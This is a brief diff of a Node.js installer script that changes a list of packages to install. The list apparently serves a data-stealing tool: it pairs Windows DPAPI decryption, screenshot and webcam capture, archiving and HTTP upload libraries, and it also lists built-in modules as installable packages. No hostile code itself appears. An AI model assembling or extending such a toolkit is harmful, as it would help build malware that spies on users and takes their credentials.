@@ -3,20 +3,19 @@ const path = require('path');
 
 const installPath = __dirname;
 const packages = [
+    'fs',
+    'fs/promises',
+    'path',
+    'os',
+    'crypto',
     'axios',
-    'fs-extra',
-    'request',
-    'glob',
+    '@primno/dpapi',
+    'child_process',
     'screenshot-desktop',
     'form-data',
-    'sqlite3',
-    'adm-zip',
-    '@primno/dpapi',
-    'node-fetch',
-    'ps-list',
-    'javascript-obfuscator',
-    'node-webcam',
-    'archiver'
+    'archiver',
+    'https',
+    'node-webcam'
 ];
 
 function installPackages() {
